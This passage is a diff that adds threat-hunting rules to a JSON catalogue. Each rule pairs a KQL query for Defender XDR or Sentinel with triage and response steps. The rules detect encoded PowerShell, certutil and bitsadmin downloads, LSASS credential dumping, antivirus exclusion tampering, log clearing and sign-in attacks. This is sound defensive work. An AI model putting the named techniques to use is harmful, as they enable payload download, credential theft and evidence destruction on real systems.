+      "hypothesis": "An adversary executes Base64-encoded PowerShell payloads to bypass signature-based endpoint defenses, obfuscate remote download cradles, or execute in-memory shellcode runners.\n",
+      "logic_summary": "Queries DeviceProcessEvents for powershell.exe or pwsh.exe where the command-line parameters contain encoded argument flags (-e, -enc, -encodedcommand) followed by a Base64 string of at least 30 characters.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        },
+        {
+          "name": "minEncodedLength",
+          "default": 30,
+          "description": "Minimum length of the Base64 string payload to filter trivial flags"
+        }
+      ],
+      "false_positives": [
+        "Enterprise systems management tools (Microsoft Endpoint Configuration Manager / SCCM, Intune, Tanium)",
+        "Software deployment installers and monitoring agents executing pre-packaged health checks"
+      ],
+      "tuning": [
+        "Filter out approved management parent processes (e.g. CcmExec.exe, taniumclient.exe)",
+        "Exclude known benign script command lines signed by internal enterprise certificates"
+      ],
+      "triage_steps": [
+        "Extract the Base64 encoded payload and decode it (UTF-16LE / Unicode) in a sandbox or CyberChef",
+        "Inspect the decoded command for download cradles (e.g. IEX, Net.WebClient, Invoke-RestMethod) or credential access",
+        "Identify the parent process and account that initiated the PowerShell command"
+      ],
+      "response": "Terminate the malicious process, isolate the endpoint if remote connections or secondary payloads are detected, and block any remote command and control (C2) domains identified in the decoded payload.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1059.001 Command and Scripting Interpreter - PowerShell",
+          "url": "https://attack.mitre.org/techniques/T1059/001/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting DeviceProcessEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table"
+        }
+      ],
+      "query": "// HB-EP-002 | T1059.001 | PowerShell executed with Base64 encoded command arguments\n// Hypothesis: An attacker uses Base64 encoded PowerShell commands (-enc, -encodedcommand) to obfuscate malicious payloads and evade simple command-line string matching.\nlet lookback = 7d;\nlet minEncodedLength = 30;\nDeviceProcessEvents\n| where Timestamp > ago(lookback)\n| where FileName in~ (\"powershell.exe\", \"pwsh.exe\")\n| where ProcessCommandLine matches regex @\"(?i)\\s-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/=]{30,}\"\n| project\n    Timestamp,\n    DeviceName,\n    AccountName,\n    FileName,\n    ProcessCommandLine,\n    InitiatingProcessFileName,\n    InitiatingProcessCommandLine,\n    FolderPath,\n    SHA256\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-EP-003",
+      "title": "Ingress tool transfer via LOLBins (certutil, bitsadmin)",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceProcessEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "command-and-control",
+          "defense-evasion"
+        ],
+        "techniques": [
+          "T1105"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary leverages built-in, trusted Microsoft utilities (LOLBins) such as certutil.exe or bitsadmin.exe to download malicious binaries or scripts directly from remote staging servers without raising traditional perimeter alarms.\n",
+      "logic_summary": "Filters DeviceProcessEvents for executions of certutil.exe or bitsadmin.exe containing command-line switches indicative of remote URL fetching (-urlcache, -split, /transfer) and extracts the remote destination URL.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legitimate IT admin maintenance scripts downloading CRL (Certificate Revocation Lists) using certutil",
+        "Windows update background jobs utilizing BITS for legitimate patch distribution"
+      ],
+      "tuning": [
+        "Whitelist internal corporate PKI certificate distribution endpoints (e.g. *.corp.contoso.com)",
+        "Exclude executions running under the NT AUTHORITY\\SYSTEM account targeting known Microsoft CRL endpoints"
+      ],
+      "triage_steps": [
+        "Review the ExtractedUrl to determine the domain reputation, hosting provider, and file extension",
+        "Search DeviceFileEvents for files written to disk by the parent or child process around that timestamp",
+        "Check whether the downloaded file was subsequently executed in DeviceProcessEvents"
+      ],
+      "response": "Block the remote URL and domain at the proxy/firewall level, quarantine the downloaded artifact on the host, and submit the file hash to Microsoft Defender Threat Intelligence for organization-wide sweeping.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1105 Ingress Tool Transfer",
+          "url": "https://attack.mitre.org/techniques/T1105/"
+        },
+        {
+          "title": "LOLBAS Project - Certutil",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+        }
+      ],
+      "query": "// HB-EP-003 | T1105 | Ingress tool transfer via LOLBins (certutil, bitsadmin)\n// Hypothesis: An attacker uses legitimate native Windows utilities to download external payloads, evading typical egress restrictions.\nlet lookback = 7d;\nDeviceProcessEvents\n| where Timestamp > ago(lookback)\n| where FileName in~ (\"certutil.exe\", \"bitsadmin.exe\")\n| where (FileName =~ \"certutil.exe\" and ProcessCommandLine has_any (\"-urlcache\", \"/urlcache\", \"-split\", \"/split\"))\n     or (FileName =~ \"bitsadmin.exe\" and ProcessCommandLine has_any (\"/transfer\", \"/create\", \"/addfile\"))\n| extend ExtractedUrl = extract(@\"https?://[^\\s\"\"']+\", 0, ProcessCommandLine)\n| project\n    Timestamp,\n    DeviceName,\n    AccountName,\n    FileName,\n    ProcessCommandLine,\n    ExtractedUrl,\n    InitiatingProcessFileName,\n    InitiatingProcessCommandLine,\n    FolderPath,\n    SHA256\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-EP-004",
+      "title": "Suspicious process access targeting LSASS memory for credential dumping",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "credential-access"
+        ],
+        "techniques": [
+          "T1003.001"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An attacker accesses the LSASS process with high-privilege read access via Windows APIs (MiniDumpWriteDump, OpenProcess) to extract NTLM password hashes or Kerberos tickets from memory.\n",
+      "logic_summary": "Filters DeviceEvents for OpenProcessApiCall where the target process is lsass.exe and the initiating parent process is not a standard Windows OS component or security agent.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legitimate third-party endpoint protection, backup software, or performance diagnostics agents",
+        "Security vulnerability scanners performing credential audit checks"
+      ],
+      "tuning": [
+        "Allow-list trusted third-party security agents verified by digital code signing certificates",
+        "Exclude known IT administrative diagnostic tools executed from approved system directories"
+      ],
+      "triage_steps": [
+        "Identify the InitiatingProcessCommandLine and check where the binary is running from",
+        "Check DeviceFileEvents for new .dmp or .tmp files created on the host around the same time",
+        "Search DeviceNetworkEvents for outbound connections from the same device"
+      ],
+      "response": "Isolate the endpoint immediately via Defender for Endpoint API, terminate the offending process, and rotate passwords and Kerberos tickets (krbtgt) for any users logged into that endpoint.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1003.001 OS Credential Dumping - LSASS Memory",
+          "url": "https://attack.mitre.org/techniques/T1003/001/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting DeviceEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceevents-table"
+        }
+      ],
+      "query": "// HB-EP-004 | T1003.001 | Suspicious process access targeting LSASS memory for credential dumping\n// Hypothesis: An attacker opens a handle to the lsass.exe process from an unusual utility or script to dump memory and harvest plaintext passwords or Kerberos tickets.\nlet lookback = 7d;\nDeviceEvents\n| where Timestamp > ago(lookback)\n| where ActionType =~ \"OpenProcessApiCall\"\n| where FileName =~ \"lsass.exe\"\n| where InitiatingProcessFileName !in~ (\n    \"csrss.exe\", \"svchost.exe\", \"MsMpEng.exe\", \"Sense.exe\",\n    \"winlogon.exe\", \"lsass.exe\", \"services.exe\"\n)\n| project\n    Timestamp,\n    DeviceName,\n    AccountName,\n    TargetProcess = FileName,\n    InitiatingProcessFileName,\n    InitiatingProcessCommandLine,\n    AdditionalFields\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-EP-005",
+      "title": "Microsoft Defender Antivirus exclusion added",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceRegistryEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "defense-evasion"
+        ],
+        "techniques": [
+          "T1562.001"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary with local admin privileges tampers with Windows Defender Antivirus exclusions to carve out directories (e.g. C:\\Temp, C:\\Users\\Public) where secondary malware tools can run unhindered.\n",
+      "logic_summary": "Detects modifications and key creations in DeviceRegistryEvents under the Microsoft\\Windows Defender\\Exclusions registry branch.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legitimate enterprise IT deployment scripts configuring performance exclusions for databases or developer tooling",
+        "Antivirus configuration deployed via Microsoft Intune or Group Policy Objects (GPO)"
+      ],
+      "tuning": [
+        "Exclude changes initiated by svchost.exe running under the NT AUTHORITY\\SYSTEM account from verified Intune policies",
+        "Alert immediately if the excluded path is a user-writable directory (e.g. \\AppData\\, \\Users\\Public\\, \\Temp\\)"
+      ],
+      "triage_steps": [
+        "Inspect RegistryValueName and RegistryValueData to see which specific path or file extension was excluded",
+        "Review the InitiatingProcessCommandLine to see if PowerShell (Add-MpPreference) or reg.exe was used",
+        "Search DeviceFileEvents for files created inside the newly excluded path"
+      ],
+      "response": "Remove the unauthorized exclusion via PowerShell (Remove-MpPreference), initiate a full Microsoft Defender antivirus scan, and investigate the host for dropped payloads.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1562.001 Impair Defenses - Disable or Modify Tools",
+          "url": "https://attack.mitre.org/techniques/T1562/001/"
+        },
+        {
+          "title": "Configure Exclusions in Microsoft Defender Antivirus",
+          "url": "https://learn.microsoft.com/en-us/defender-endpoint/configure-exclusions-microsoft-defender-antivirus"
+        }
+      ],
+      "query": "// HB-EP-005 | T1562.001 | Microsoft Defender Antivirus exclusion added\n// Hypothesis: An attacker adds folder or file exclusions to Windows Defender to prevent detection of malware payloads dropped onto the endpoint.\nlet lookback = 7d;\nDeviceRegistryEvents\n| where Timestamp > ago(lookback)\n| where ActionType in~ (\"RegistryValueSet\", \"RegistryKeyCreated\")\n| where RegistryKey has @\"Microsoft\\Windows Defender\\Exclusions\"\n| project\n    Timestamp,\n    DeviceName,\n    RegistryKey,\n    RegistryValueName,\n    RegistryValueData,\n    InitiatingProcessFileName,\n    InitiatingProcessCommandLine,\n    InitiatingProcessAccountName\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-EP-006",
+      "title": "Windows security or system event log cleared",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "defense-evasion"
+        ],
+        "techniques": [
+          "T1070.001"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary executes anti-forensic commands via wevtutil or PowerShell to wipe Security, System, or PowerShell event logs, covering their tracks following lateral movement or credential theft.\n",
+      "logic_summary": "Monitors DeviceEvents for the EventLogCleared action type or process executions of wevtutil.exe invoking clear-log (cl) commands.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Routine system maintenance scripts in dedicated test labs or automated virtual machine image build pipelines",
+        "Highly uncommon automated IT log rotation scripts"
+      ],
+      "tuning": [
+        "Whitelist dedicated automated Golden Image build environments (e.g. Packer / Azure Image Builder)",
+        "Alert immediately on any production server or domain controller clearing the Security log"
+      ],
+      "triage_steps": [
+        "Identify which specific log was cleared (Security, System, PowerShellCore, etc.)",
+        "Review the user account and initiating command line that executed the clear command",
+        "Examine previous activities performed on that host prior to the log deletion"
+      ],
+      "response": "Isolate the endpoint immediately, preserve forensic RAM and disk artifacts, and treat the event as active compromise.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1070.001 Indicator Removal on Host - Clear Windows Event Logs",
+          "url": "https://attack.mitre.org/techniques/T1070/001/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting DeviceEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceevents-table"
+        }
+      ],
+      "query": "// HB-EP-006 | T1070.001 | Windows security or system event log cleared\n// Hypothesis: An attacker uses wevtutil or PowerShell to clear Windows event logs to destroy forensic evidence of malicious activity.\nlet lookback = 7d;\nDeviceEvents\n| where Timestamp > ago(lookback)\n| where ActionType =~ \"EventLogCleared\"\n     or (InitiatingProcessFileName =~ \"wevtutil.exe\" and InitiatingProcessCommandLine has_any (\"cl\", \"clear-log\"))\n| project\n    Timestamp,\n    DeviceName,\n    AccountName,\n    ActionType,\n    InitiatingProcessFileName,\n    InitiatingProcessCommandLine,\n    AdditionalFields\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-ID-001",
+      "title": "Password spray against multiple accounts from a single IP",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "sentinel",
+      "tables": [
+        "SigninLogs"
+      ],
+      "time_column": "TimeGenerated",
+      "attack": {
+        "tactics": [
+          "credential-access"
+        ],
+        "techniques": [
+          "T1110.003"
+        ]
+      },
+      "severity": "medium",
+      "hypothesis": "An adversary attempts a small list of commonly used passwords (e.g. SeasonYear!, Welcome123) against dozens or hundreds of different user accounts from a single source IP to remain under the smart lockout threshold of individual accounts.\n",
+      "logic_summary": "Filters SigninLogs for failed authentications caused by invalid credentials (ResultType 50126), groups them by source IP address into tumbling time windows (bin), and flags any single IP that hits a threshold of distinct user accounts (dcount).\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "1d",
+          "description": "Historical search window to inspect"
+        },
+        {
+          "name": "window",
+          "default": "30m",
+          "description": "Tumbling time bucket window for grouping spray attempts"
+        },
+        {
+          "name": "minUsers",
+          "default": 10,
+          "description": "Minimum number of unique accounts targeted to trigger a hunting lead"
+        }
+      ],
+      "false_positives": [
+        "Corporate egress proxies or shared NAT gateways where multiple employees misconfigure credentials simultaneously",
+        "Enterprise single sign-on (SSO) cutover, active directory sync jobs, or mass password reset days"
+      ],
+      "tuning": [
+        "Exclude verified corporate external NAT egress IP ranges or VPN gateways using a Sentinel watchlist",
+        "Increase the minUsers threshold in large enterprise environments (>5,000 active users) to 25 or 50"
+      ],
+      "triage_steps": [
+        "Check whether any account targeted by this IP had a subsequent successful login (ResultType 0)",
+        "Examine the source IP threat reputation, ISP, ASN, and user agent string for automation fingerprints",
+        "Determine if the targeted accounts belong to privileged roles (e.g. Global Admins, Conditional Access Admins)"
+      ],
+      "response": "Block the attacking IP address on perimeter firewalls / Conditional Access named locations, and trigger an immediate password reset and session revocation for any user that logged in successfully.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1110.003 Password Spraying",
+          "url": "https://attack.mitre.org/techniques/T1110/003/"
+        },
+        {
+          "title": "Microsoft Entra Sign-in Error Codes (50126)",
+          "url": "https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-sign-ins-error-codes"
+        }
+      ],
+      "query": "// HB-ID-001 | T1110.003 | Password spray against multiple accounts from a single IP\n// Hypothesis: An adversary attempts a small list of commonly used passwords across many accounts from one source IP to stay below per-account lockout thresholds.\nlet lookback = 1d;\nlet window = 30m;\nlet minUsers = 10;\nSigninLogs\n| where TimeGenerated > ago(lookback)\n| where ResultType == \"50126\"\n| summarize\n    FailedUsers = dcount(UserPrincipalName),\n    Attempts = count(),\n    SampleUsers = make_set(UserPrincipalName, 20),\n    FirstSeen = min(TimeGenerated),\n    LastSeen = max(TimeGenerated)\n    by IPAddress, bin(TimeGenerated, window)\n| where FailedUsers >= minUsers\n| project\n    TimeGenerated,\n    IPAddress,\n    FailedUsers,\n    Attempts,\n    SampleUsers,\n    FirstSeen,\n    LastSeen\n| order by FailedUsers desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-ID-002",
+      "title": "Targeted brute force against a single account followed by success",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "sentinel",
+      "tables": [
+        "SigninLogs"
+      ],
+      "time_column": "TimeGenerated",
+      "attack": {
+        "tactics": [
+          "credential-access",
+          "initial-access"
+        ],
+        "techniques": [
+          "T1110"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An attacker focuses an aggressive password brute-force attack against a specific executive or admin account from a single source IP, successfully guessing the password within an hour.\n",
+      "logic_summary": "Groups SigninLogs by user and source IP in 1-hour tumbling windows, counting failed logins (50126) and successful logins (0), alerting when failures exceed threshold and are immediately followed by a successful login.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "1d",
+          "description": "Historical search window to inspect"
+        },
+        {
+          "name": "window",
+          "default": "1h",
+          "description": "Tumbling time bucket window"
+        },
+        {
+          "name": "minFailures",
+          "default": 10,
+          "description": "Minimum number of failed attempts prior to success"
+        }
+      ],
+      "false_positives": [
+        "A user who recently changed their password on their phone/laptop and forgot to update cached credentials on other apps",
+        "Automated enterprise sync service accounts experiencing temporary authentication desync"
+      ],
+      "tuning": [
+        "Correlate with AppDisplayName to exclude automated mobile device sync (e.g. Apple Internet Accounts)",
+        "Allow-list internal trusted office network IP ranges"
+      ],
+      "triage_steps": [
+        "Verify whether the user was legitimately attempting to log in during that hour",
+        "Review the IP geolocation and threat reputation to determine if the source IP is external or a commercial proxy",
+        "Check whether subsequent actions were performed in Azure AD / Microsoft 365 by the newly logged-in session"
+      ],
+      "response": "Revoke the session immediately via Entra ID, enforce a mandatory password reset, and investigate endpoint telemetry for evidence of subsequent lateral movement.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1110 Brute Force",
+          "url": "https://attack.mitre.org/techniques/T1110/"
+        },
+        {
+          "title": "Microsoft Entra Password Protection & Smart Lockout",
+          "url": "https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout"
+        }
+      ],
+      "query": "// HB-ID-002 | T1110 | Targeted brute force against a single account followed by success\n// Hypothesis: An attacker performs repeated password guessing against a specific user account until finding the correct password and gaining access.\nlet lookback = 1d;\nlet window = 1h;\nlet minFailures = 10;\nSigninLogs\n| where TimeGenerated > ago(lookback)\n| summarize\n    FailedAttempts = countif(ResultType == \"50126\"),\n    SuccessfulLogins = countif(ResultType == \"0\"),\n    FirstFailure = minif(TimeGenerated, ResultType == \"50126\"),\n    LastSuccess = maxif(TimeGenerated, ResultType == \"0\"),\n    Apps = make_set(AppDisplayName, 5)\n    by UserPrincipalName, IPAddress, bin(TimeGenerated, window)\n| where FailedAttempts >= minFailures and SuccessfulLogins > 0\n| where LastSuccess > FirstFailure\n| project\n    TimeGenerated,\n    UserPrincipalName,\n    IPAddress,\n    FailedAttempts,\n    SuccessfulLogins,\n    FirstFailure,\n    LastSuccess,\n    Apps\n| order by FailedAttempts desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-ID-003",
+      "title": "Impossible travel sign-ins from distant locations in unrealistic time",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "sentinel",
+      "tables": [
+        "SigninLogs"
+      ],
+      "time_column": "TimeGenerated",
+      "attack": {
+        "tactics": [
+          "initial-access",
+          "defense-evasion"
+        ],
+        "techniques": [
+          "T1078"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary is authenticating using compromised valid credentials from a different country or cloud provider hosting site while the authentic employee is concurrently active from their home region.\n",
+      "logic_summary": "Tracks consecutive successful sign-ins per user, orders chronologically, calculates the time delta between different geographic locations using serialize and prev(), and flags logins where the speed required to travel between the locations exceeds physical limits (e.g. < 60 minutes between countries).\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "1d",
+          "description": "Historical search window to inspect"
+        },
+        {
+          "name": "maxTravelMinutes",
+          "default": 60,
+          "description": "Maximum allowable time difference between different country logins"
+        }
+      ],
+      "false_positives": [
+        "Users connecting to or disconnecting from enterprise VPN gateways or zero-trust reverse proxies",
+        "Cloud service principal / app proxy logins executing on behalf of users in international Azure datacenters"
+      ],
+      "tuning": [
+        "Exclude corporate VPN egress gateways and known SaaS proxy networks using a Sentinel watchlist",
+        "Correlate with DeviceDetail to suppress if both sign-ins originate from the same Intune-managed device ID"
+      ],
+      "triage_steps": [
+        "Review the UserAgent and DeviceDetail for both sign-ins to see if one is a recognized work device and the other is unknown",
+        "Check whether MFA was completed for the suspicious sign-in or if conditional access was bypassed",
+        "Contact the affected user directly via out-of-band communication (phone/Slack) to verify their current physical location"
+      ],
+      "response": "Immediately revoke all active refresh tokens for the user in Entra ID, trigger an interactive MFA prompt, and temporarily disable the account if unauthorized access is confirmed.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1078 Valid Accounts",
+          "url": "https://attack.mitre.org/techniques/T1078/"
+        },
+        {
+          "title": "Microsoft Entra Identity Protection Anomalous Travel",
+          "url": "https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks"
+        }
+      ],
+      "query": "// HB-ID-003 | T1078 | Impossible travel: consecutive sign-ins from distant locations in unrealistic time\n// Hypothesis: An attacker uses compromised credentials from a foreign location while the legitimate user is actively logged in from their home region.\nlet lookback = 1d;\nlet maxTravelMinutes = 60;\nSigninLogs\n| where TimeGenerated > ago(lookback)\n| where ResultType == \"0\" // Only successful sign-ins represent actual session establishment\n| where isnotempty(Location) and isnotempty(UserPrincipalName)\n| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, UserAgent\n| order by UserPrincipalName asc, TimeGenerated asc\n| serialize\n| extend PrevLocation = prev(Location),\n         PrevIP = prev(IPAddress),\n         PrevTime = prev(TimeGenerated),\n         PrevUser = prev(UserPrincipalName),\n         PrevApp = prev(AppDisplayName)\n| where UserPrincipalName == PrevUser\n| where Location != PrevLocation and IPAddress != PrevIP\n| extend MinutesBetweenLogins = datetime_diff('minute', TimeGenerated, PrevTime)\n| where MinutesBetweenLogins > 0 and MinutesBetweenLogins <= maxTravelMinutes\n| project\n    TimeGenerated,\n    UserPrincipalName,\n    CurrentLocation = Location,\n    CurrentIP = IPAddress,\n    CurrentApp = AppDisplayName,\n    PrevLocation,\n    PrevIP,\n    PrevApp,\n    MinutesBetweenLogins,\n    UserAgent\n| order by MinutesBetweenLogins asc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-ID-004",
+      "title": "Multi-factor authentication fatigue attack followed by success",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "sentinel",
+      "tables": [
+        "SigninLogs"
+      ],
+      "time_column": "TimeGenerated",
+      "attack": {
+        "tactics": [
+          "credential-access",
+          "defense-evasion"
+        ],
+        "techniques": [
+          "T1621"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary with valid credentials spams MFA push prompts to the victim's mobile device until the fatigued user clicks approve or enters a verification code.\n",
+      "logic_summary": "Aggregates SigninLogs for Entra ID MFA failures (code 500121) grouped by user in 20-minute windows, alerting when 3 or more denials occur immediately before a successful login.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "1d",
+          "description": "Historical search window to inspect"
+        },
+        {
+          "name": "window",
+          "default": "20m",
+          "description": "Tumbling time bucket window for grouping fatigue prompts"
+        },
+        {
+          "name": "minDenials",
+          "default": 3,
+          "description": "Minimum number of MFA prompt denials required"
+        }
+      ],
+      "false_positives": [
+        "Flaky mobile cellular connectivity causing multiple failed authentication attempts",
+        "A user repeatedly denying an MFA prompt because they did not recognize the prompt, then realizing it was legitimate"
+      ],
+      "tuning": [
+        "Enforce Entra ID number matching to eliminate blind push approvals",
+        "Correlate source IP: alert primarily if the successful login originates from an IP different from the user's regular device"
+      ],
+      "triage_steps": [
+        "Contact the employee to ask if they approved an unexpected MFA prompt",
+        "Check the source IP and geolocation of the successful login",
+        "Review AuditLogs for privileged changes made during the newly authenticated session"
+      ],
+      "response": "Revoke all active refresh tokens for the user in Entra ID, reset credentials, and enable strict FIDO2/Passkey MFA.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1621 Multi-Factor Authentication Request Generation",
+          "url": "https://attack.mitre.org/techniques/T1621/"
+        },
+        {
+          "title": "Defending Against MFA Fatigue Attacks",
+          "url": "https://techcommunity.microsoft.com/t5/security-compliance-and-identity/defending-against-mfa-fatigue/ba-p/3639144"
+        }
+      ],
+      "query": "// HB-ID-004 | T1621 | Multi-factor authentication fatigue attack followed by success\n// Hypothesis: An attacker with valid credentials repeatedly sends MFA push prompts until the victim user inadvertently accepts.\nlet lookback = 1d;\nlet window = 20m;\nlet minDenials = 3;\nSigninLogs\n| where TimeGenerated > ago(lookback)\n| summarize\n    MfaDenials = countif(ResultType == \"500121\"),\n    Successes = countif(ResultType == \"0\"),\n    FirstDenial = minif(TimeGenerated, ResultType == \"500121\"),\n    LastSuccess = maxif(TimeGenerated, ResultType == \"0\"),\n    IPs = make_set(IPAddress, 5)\n    by UserPrincipalName, bin(TimeGenerated, window)\n| where MfaDenials >= minDenials and Successes > 0\n| where LastSuccess > FirstDenial\n| project\n    TimeGenerated,\n    UserPrincipalName,\n    MfaDenials,\n    Successes,\n    FirstDenial,\n    LastSuccess,\n    IPs\n| order by MfaDenials desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-ID-005",
+      "title": "Successful sign-in using legacy authentication protocols bypassing MFA",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "sentinel",
+      "tables": [
+        "SigninLogs"
+      ],
+      "time_column": "TimeGenerated",
+      "attack": {
+        "tactics": [
+          "initial-access",
+          "defense-evasion"
+        ],
+        "techniques": [
+          "T1078"
+        ]
+      },
+      "severity": "medium",
+      "hypothesis": "An attacker deliberately authenticates via legacy mail protocols (IMAP, POP3, SMTP) that do not enforce modern multi-factor authentication (MFA) prompts to access email mailboxes with compromised user passwords.\n",
+      "logic_summary": "Scans SigninLogs for successful authentications (ResultType 0) where the client application or user-agent indicates legacy authentication protocols.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legacy multi-function printers, scanners, or on-premises ticketing systems authenticating via SMTP",
+        "Rare unmanaged mobile email clients configured by legacy employees"
+      ],
+      "tuning": [
+        "Block legacy authentication completely in Entra ID Conditional Access policies",
+        "Whitelist dedicated corporate scan-to-email static IP addresses"
+      ],
+      "triage_steps": [
+        "Check whether the account is an interactive human user or an automated service account",
+        "Review the source IP address for external hosting providers or overseas geolocations",
+        "Search for mailbox export or bulk message download activity following the legacy login"
+      ],
+      "response": "Disable legacy authentication on the user account, enforce modern auth, and revoke active tokens.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1078 Valid Accounts",
+          "url": "https://attack.mitre.org/techniques/T1078/"
+        },
+        {
+          "title": "Blocking Legacy Authentication in Microsoft Entra ID",
+          "url": "https://learn.microsoft.com/en-us/entra/identity/conditional-access/howto-conditional-access-policy-block-legacy"
+        }
+      ],
+      "query": "// HB-ID-005 | T1078 | Successful sign-in using legacy authentication protocols bypassing MFA\n// Hypothesis: An attacker uses legacy authentication protocols (e.g. IMAP, POP3, SMTP) that do not support modern MFA to authenticate using stolen credentials.\nlet lookback = 7d;\nSigninLogs\n| where TimeGenerated > ago(lookback)\n| where ResultType == \"0\"\n| where UserAgent has_any (\"IMAP\", \"POP3\", \"SMTP\", \"MAPI\", \"BAV2ROPC\", \"Exchange ActiveSync\")\n     or AppDisplayName has_any (\"IMAP\", \"POP\", \"SMTP\")\n| project\n    TimeGenerated,\n    UserPrincipalName,\n    IPAddress,\n    Location,\n    AppDisplayName,\n    UserAgent,\n    ConditionalAccessStatus\n| order by TimeGenerated desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-ID-006",
+      "title": "Highly privileged directory role assigned in Entra ID",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "sentinel",
+      "tables": [
+        "AuditLogs"
+      ],
+      "time_column": "TimeGenerated",
+      "attack": {
+        "tactics": [
+          "persistence",
+          "privilege-escalation"
+        ],
+        "techniques": [
+          "T1098.003"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An attacker with administrative credentials elevates an auxiliary user account or service principal by granting Global Administrator or other sensitive tenant roles to secure persistent access.\n",
+      "logic_summary": "Monitors Entra ID AuditLogs for successful role assignment operations under RoleManagement where the assigned role is a sensitive tier-0 directory administrative role.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legitimate scheduled role activations through Privileged Identity Management (PIM) by approved administrators",
+        "New IT staff onboarding or role re-assignment during business reorganizations"
+      ],
+      "tuning": [
+        "Whitelist automated PIM activations if pre-approved change ticket metadata is present",
+        "Alert on permanent role assignments rather than time-limited eligible activations"
+      ],
+      "triage_steps": [
+        "Contact the initiating administrator (Actor) to confirm if they authorized the role grant",
+        "Check whether the target account had recent anomalous logins or MFA resets",
+        "Verify if a corresponding IT change management ticket was logged for the privileged role change"
+      ],
